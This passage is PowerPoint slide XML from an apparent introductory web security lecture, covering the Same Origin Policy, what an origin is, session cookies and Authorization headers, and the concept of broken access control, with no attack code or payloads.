            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5573064" y="5937868"/>
            <a:ext cx="5624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Requests can come from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" i="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>anywhere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6E431E-0F0B-6C9A-9A84-BE84D444035B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8458200" y="2194731"/>
            <a:ext cx="908056" cy="41989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96F0245-5F5D-BE31-1D5C-41E6179BF0A1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7417397" y="2684190"/>
            <a:ext cx="1948859" cy="289636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4352051D-6EAC-DA42-C8F1-B037ADACD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Frontend, Backend, and Browser</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="21" name="Picture 20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E9351FAA-F6B6-C57F-3188-EE4D004F1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27238253-17F9-94D9-8FA1-3448047343B0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4056182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526E13-590F-47D5-0B5C-50EEB103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2B88-A92B-D0E6-E8B5-89AEC5F2B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Browsers and JavaScript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67856-AF2B-D175-1E94-2D10C7DCA73B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A39F8B-66C0-8EE6-BEBB-EAB7DCDC6C7C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F12B8-D5D2-6BB7-0C2A-503037C1BAC7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A681F9-A8F9-C623-C47D-B47586E5ACFB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22C9AA-A651-BE3F-422B-718786830313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A399C3-5C0F-5CDC-1743-2127FE007EA4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67005A-8696-E103-ACE6-6A18357B8A22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D760BE-3F58-CA76-E6A5-2B99CA56C664}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2922110" y="1567931"/>
            <a:ext cx="9016283" cy="3390932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9FE52-A11D-9F24-6B05-57B6F7EA1ACA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3197610" y="2211086"/>
            <a:ext cx="1582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B9F116B-C091-349C-F73F-C628CC599171}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4890481" y="2252009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Storage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3EBB806-F1A0-0E99-6F35-2D013010A634}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4890481" y="3358627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Cookies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3EBD6BD-23AF-B982-FDF7-95AA4437356E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3205847" y="2181705"/>
            <a:ext cx="1565821" cy="219850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HTML</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>CSS</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>JavaScript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E9CC5BB5-B069-74AD-BE0A-EF916B60F735}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2814638" y="5768175"/>
            <a:ext cx="8863883" cy="969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Browsers introduced JavaScript for the first time in Netscape2.0</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l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JavaScript could read data returned from other web servers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A47277-6BAF-408F-A614-6077C5C40123}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8395235" y="2180242"/>
            <a:ext cx="1582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4551C69-75D3-5205-1DB0-BD58F214237B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10088106" y="2221165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Storage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95921B4-FC4E-E03C-B5D2-AFED24F8C83B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10088106" y="3327783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Cookies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6A88ABE-7DBC-9243-4797-C32889D0F630}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8371843" y="2180823"/>
            <a:ext cx="1565821" cy="219850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HTML</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>CSS</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>JavaScript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ED22B7-E18E-78BF-28B9-09505F0696E4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3328224" y="1557022"/>
            <a:ext cx="14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Browser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7A84854-F06A-9A3E-68CD-AC61B8810679}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6588369" y="2567354"/>
            <a:ext cx="1662097" cy="415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1B25B90-0731-EA2E-337D-7C8F9FB9F219}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6611933" y="226373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JS Read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F1F238-5CC1-31AA-4C23-C8ACBB6AC79F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7467879" y="3950421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JS Read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7F835BC-D499-4EC6-334B-9BDA18A5ABC4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" flipV="1">
            <a:off x="6611933" y="4221362"/>
            <a:ext cx="1660203" cy="3084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73FFD08B-2076-B694-CB99-D7087D65B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88B9C1A-952A-822F-989C-81DF2F5C039A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520992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3D976-F438-3323-56EB-B6827FC48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468D5-31F0-A55F-0B3A-900F66FB8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Same Origin Policy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15201-711E-6CB2-C1BD-9ADFF81F338B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256865-5828-FD25-BF55-E7FD6F816F72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09FABB-FAA5-1E85-D73D-55A2A981133C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D24501-8362-F819-8D7D-63E0B962A8CA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78FFBA-12DE-4289-18CB-D3B289501196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3F80CA-3F22-BD93-0C4D-E02A515BFF01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B00653-4231-7697-1B8B-9A6E2FDF042F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BF0562-7A8B-1FE7-B289-A1B714AF3F25}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2922110" y="1567931"/>
            <a:ext cx="9016283" cy="3390932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16036-A34C-A48D-B69C-4CC690C2FF0C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8312861" y="5060454"/>
            <a:ext cx="3066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Same Origin Policy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D2759-CE89-F529-5D05-D36548D24068}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3197610" y="2211086"/>
            <a:ext cx="1582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2526A9-CFBF-3CC8-32FA-D7C1C03D331F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3074511" y="2031096"/>
            <a:ext cx="3513858" cy="2716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28EE0E-DFE7-AC5B-F9E9-D89855EA2A86}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4890481" y="2252009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Storage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102328-61A3-BACB-DBBF-1ABFE444ED3E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4890481" y="3358627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Cookies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05BCA7-426C-30D6-648B-95302AA0B24E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4828810" y="4238416"/>
            <a:ext cx="1394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Origin A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83B7CDA-73BD-5B89-89B1-B37B6984B397}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3205847" y="2181705"/>
            <a:ext cx="1565821" cy="219850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HTML</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>CSS</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>JavaScript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77BC7381-B9ED-5148-E648-F3302AEF3403}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2814638" y="5662744"/>
            <a:ext cx="8863883" cy="13725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SOP Does not prevent cross-origin requests</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l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SOP prevents JavaScript from inspecting cross-origin responses</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l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BFB9E6-7C81-7E6C-C0F1-9947F262A314}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8395235" y="2180242"/>
            <a:ext cx="1582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8D320BF-AFDC-BE0F-2FC2-75DCBB57116B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8272136" y="2000252"/>
            <a:ext cx="3513858" cy="2716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0D991A4-7DC1-7DB9-8233-7D8DB4D5B3D9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10088106" y="2221165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Storage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4CE745E-BE0D-7447-4A61-DEEEF1FFE544}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10088106" y="3327783"/>
            <a:ext cx="1565821" cy="89357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Cookies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DA3EDC-4B24-3D93-E093-60C096DA41BC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10026435" y="4207572"/>
            <a:ext cx="1399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Origin B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B271AF6-F765-EA9F-2C4F-64CADF1AF723}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8371843" y="2180823"/>
            <a:ext cx="1565821" cy="2198509"/>
          </a:xfrm>
          <a:prstGeom prst="round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HTML</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>CSS</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>JavaScript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F834401-797B-97FE-0B4D-FC50643747AD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:stCxn id="5" idx="0"/>
            <a:endCxn id="5" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7430252" y="1567931"/>
            <a:ext cx="0" cy="339093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Medieval Armor with solid fill">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8375C91F-2EA2-DEA4-FAC5-CC13701B5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6587" y="2842553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3C29A56-B3F3-00C8-2DED-743D44C33A8B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3328224" y="1557022"/>
            <a:ext cx="145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Browser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B320954-9EAE-2E35-6416-5C5491FCB1B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7451923" y="4608428"/>
            <a:ext cx="860938" cy="7136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1C4272C-7696-7B30-CF9B-3690FBE765E5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6588369" y="2567354"/>
            <a:ext cx="84188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BA3372-942E-47FC-2E93-0BC5EE551FAB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6611933" y="226373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JS Read</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="&quot;No&quot; Symbol 51">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CCDBAE5B-CB0D-D4AA-9A16-0E5BDAF8DD94}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7430251" y="2430924"/>
            <a:ext cx="304433" cy="281175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&quot;No&quot; Symbol 52">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{41475A70-8387-CEC3-EF9D-6465C56905B5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7090510" y="4076732"/>
            <a:ext cx="304433" cy="281175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4B5E02-A646-16EA-5743-F1B6C17AE9B2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7467879" y="3950421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JS Read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27ADC3-E02B-C784-3CF3-6F25B450A67A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="7451234" y="4252206"/>
            <a:ext cx="82090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3DBD371E-8C18-2A60-AFAA-9D08F4B47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974A02BC-FB23-61F8-9845-DD6866789E38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4208744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395E2-0265-0C8D-1114-A504DECDB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5090-2FEB-899C-B8E9-469A9AB31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What is an “Origin”?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AD56D1-6AE9-8E9A-14E0-C0F258882C42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145BAE-6797-AB2C-1991-A8A67C78F7B5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AA446B-B43B-BCE4-F3C1-680A5633EE5E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0A9D75-EB35-F42B-B0A1-65CBD09C773F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F966ED-5B3C-47C0-8F5B-5E5A5D053C31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31ACAA-4E7A-B9D5-D06A-C27435FFE73A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FFDF64D-2878-024E-F18E-CC8E238B8876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A41A6099-0DEE-A6A5-624A-9A311E1BECA3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2957511" y="1540272"/>
            <a:ext cx="8980883" cy="50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Definition of “Origin”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Protocol, Host, and Port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Examples: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https://example.com:443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http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>example.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRP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https://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>foo.bar.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRP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https://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>dev.bar.com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" name="Picture 3" descr="A pixel art of a green character&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{93BB6105-1050-DE2F-4FE6-1996E476E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824" y="1835943"/>
            <a:ext cx="1473200" cy="1473200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4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7C00A04B-28B0-83E3-85E1-6816A1332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E32AB49-4FD4-6451-DC31-37C4ABC88B35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942735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1DFA4-7F9A-6A99-6C1E-3CED3A6A3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02E0-748F-2A7F-EA94-143A68EF5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DDECE2-409F-D2D5-1A7C-5EC740760DD2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93FC3A-B282-A787-C06D-94337D1F1B6D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901758-3C4D-BDCC-A61D-5679B4271071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B9858E-E42C-2FBF-C8D8-A614A949FB6E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33A36A-4AA8-2804-B64E-FA8655C0FCF5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3A9C48-61AC-6778-F807-5B3DFB213156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9F256A-7D22-36A1-E49C-B29E5FDA2241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109EF5DC-122C-66CE-7E3E-06F33723A56C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2957511" y="1540272"/>
            <a:ext cx="8980883" cy="50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How does a website you’ve logged into know that a request came from you?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CEB8EE2B-2179-1C97-150F-A09A941E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13B774C-0893-9B37-7D33-72677CA20065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392328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84234-9D05-B4C3-A52C-D0B6520C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66797-76F5-FB7E-47ED-4FEEF39CA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2563A-1C7B-364E-00DA-102A40C0C78F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5C8F-012D-584E-5BC2-DDF1821E6D85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28979D-A57A-0ABD-8D41-872042740685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897A0E-8E19-7E25-9A83-924972097248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E9D3A1-45BE-E537-7EF0-9964D74D5F62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D648D1-184E-4235-B84B-75A088167FD7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D1F12FE-917C-0D72-E08A-3A110A95C145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EB0ACBED-57CE-8FC2-5020-E2040617D993}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2957511" y="1540272"/>
            <a:ext cx="8980883" cy="1142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How does a website you’ve logged into know that a request came from you?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77ECAF60-9562-E897-6205-3116FEE27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763" y="3200399"/>
            <a:ext cx="1371600" cy="1371600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="Picture 9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91D056ED-0EA5-C97E-DBFF-F0D1A91DE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19" y="2803129"/>
            <a:ext cx="1371600" cy="1371600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Picture 10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1549F082-B027-4C14-05AC-1305CB4C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67" y="3428999"/>
            <a:ext cx="1371600" cy="13716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03806BD-610C-6472-0B60-32A41602A60F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5890266" y="2803129"/>
            <a:ext cx="5913119" cy="198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Cookie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Authorization Header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Tied to the origin that set it</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3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F17E838F-5050-E659-38C0-B12262316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F7C253F-DB0A-BB18-627D-F2F7D934ACC3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369434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D0621-1BD2-640A-15A8-D1E0FABD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ave the Merit, Save the World">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C8374D8D-9658-3A43-9D26-6FE150717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41" b="17311"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8889000" y="4645475"/>
            <a:ext cx="3148050" cy="213904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09173C-1A53-7EAD-C9F2-A646AE1B0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Sessions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85DCB2-0F0C-ADD3-3DB9-58ABAF9CDD5D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D7F455-1E85-ED89-8313-786D77C171C4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21C08B-8CAF-AD9F-38FD-BDFBB6E7BB1E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469ABC-ED7E-6C17-0A25-B44CA35B586D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552FFA-EE11-34FE-7686-CA8A7D65E874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DFDEB2-0649-1F96-06EA-6B1C59988947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5D1B0B-9E4B-E629-E358-113881B9AEB2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82433A8B-FFDC-A1A9-3CC5-30AC1E433F5F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2957511" y="1540272"/>
            <a:ext cx="8980883" cy="1142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How does a website you’ve logged into know that a request came from you?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7F0297D0-D171-01E7-C530-C3BFD3C1B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763" y="3200399"/>
            <a:ext cx="1371600" cy="1371600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="Picture 9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7D2BCD02-2B89-48CE-4A7D-3F289ED44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919" y="2803129"/>
            <a:ext cx="1371600" cy="1371600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Picture 10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98B76D07-6AE1-29FE-5BBB-033C4C4B8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667" y="3428999"/>
            <a:ext cx="1371600" cy="13716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31D13426-C858-E748-F2A1-3E8CB1EC3B6C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5890266" y="2803129"/>
            <a:ext cx="5913119" cy="1989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Cookie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Authorization Header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Tied to the origin that set it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D6DE34F-7F4A-B37A-E812-74243D3B5A62}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2933707" y="5089127"/>
            <a:ext cx="5913119" cy="1544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This value represents the user. It is sensitive. Keep it secret. Keep it safe.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83EEB4B0-0425-3699-E9AE-E7A59F9B1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90C6A4E-CC2F-C8DE-367D-EB8134091441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23654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1F914-3A58-CBFB-D1A3-44C42004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55F51-76BC-4B20-5A5B-5D363D6D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9" y="119859"/>
            <a:ext cx="7011942" cy="903285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Intro: Broken Access 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A01AEC-7AA0-B4E0-66FB-1BB6B1A47DE5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3753E0-8E6C-25CB-4F71-6F1ACEB7692D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B73C3D-14D6-EC9F-07E9-B652EC0FB513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373575-1CB3-4FFA-9434-DE9152B7DC61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B247DA-58F1-D521-C323-3F04E8D57520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796D43-DE05-BF5C-2A72-E3B866D77CB0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FA2B02-1413-7DD8-CA9A-C682570D7730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DDBA8C4F-8ADA-349E-7944-2650E2E52B8D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2957511" y="1540271"/>
            <a:ext cx="9115426" cy="4540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Broken Access Control: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A security flaw where an application </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>does not correctly restrict access</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> to resources or actions, enabling users to access data or functionality </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>beyond their intended permissions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Business Logic Flaw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Highly Common</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200" algn="l">
              <a:buFontTx/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Two main types: Function-level and Object-level</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4" descr="A pixelated cartoon of a person holding a computer&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D4C774B9-D0B5-853E-99F3-9379C0507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45" y="5549901"/>
            <a:ext cx="1469171" cy="1473200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
